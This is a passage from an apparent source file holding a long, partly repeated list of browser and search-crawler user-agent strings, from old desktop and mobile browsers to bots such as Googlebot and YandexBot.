               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)',
               'Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com',
               'Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)',
               'Mozilla/4.0 (compatible; Arachmo)', 'Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
               'Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)',
               'BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)',
               'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
               'Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)',
               'Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)',
               'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)',
               'Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)',
               'Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1',
               'Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
               'Mozilla/5.0 (PLAYSTATION 3; 3.55)', 'Mozilla/5.0 (PLAYSTATION 3; 2.00)',
               'Mozilla/5.0 (PLAYSTATION 3; 1.00)',
               'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0',
               'Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)',
               'SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)',
               'Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))',
               'Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E',
               'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
               'Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57',
               'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)',
               'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)',
               'Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0',
               'Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g',
               'Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)',
               'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125',
               'Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)',
               'Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)',
               'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
               'Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)',
               'Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)',
               'Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4',
               'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0',
               'Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10',
               'Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)',
               'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
               'Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)',
               'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
               'Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16',
               'Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)',
               'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51',
               'Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)',
               'Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7',
               'BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0',
               'Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)',
               'Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)',
               'Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)',
               'Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10',
               'Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)',
               'Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007',
               'BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)',
               'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)',
               'Googlebot/2.1 (http://www.googlebot.com/bot.html)', 'Opera/9.20 (Windows NT 6.0; U; en)',
               'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)',
               'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)',
               'Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0',
               'Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16',
               'Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)',
               'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13',
               'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
